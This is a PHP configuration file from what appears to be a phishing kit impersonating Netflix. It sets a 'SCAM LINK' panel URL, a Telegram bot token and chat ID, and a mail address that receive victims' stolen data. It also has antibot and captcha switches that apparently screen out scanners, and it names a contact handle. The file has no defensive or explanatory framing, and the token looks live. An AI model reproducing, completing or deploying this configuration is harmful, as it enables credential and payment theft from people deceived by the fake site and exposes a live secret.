<?php
/*
DM:@earthshakingg
*/
session_start();
error_reporting(0);

// Hcaptcha https://www.hcaptcha.com/
define("HCAPTCHA", false); // true or false
define("SECRETKEY", ''); // secretkey hcaptcha
define("SITEKEY", ''); // site key hcaptcha

define("TESTMODE", true); // true or false
define("ANTIBOTPW_API", ''); // ANTIBOT.PW API

define("FLAG", '🎞️');
define("SCAM_NAME", 'NETFLIX');
define("WEBSITE", 'https://netflix.com/');

// SCAM LINK
define("PANEL", 'https://usa-worldwide.info/providers/');
// TELEGRAM BOT REZ CONFIG
define("TOKEN", '7061649217:AAE06smcJftZv4WJkgtr2FNzQuBFT_SaI0o');
define("CHATID", '-1002171187228');

define("NOTIF", true); // true or false
define("NOTIF_CHATID", '-');

// MAIL REZ CONFIG
define("BULLET", 'YOUREMAIL@EMAIL.COM');

define("PHONE", false); // true or false
define("CONTROLLER", true); // true or false
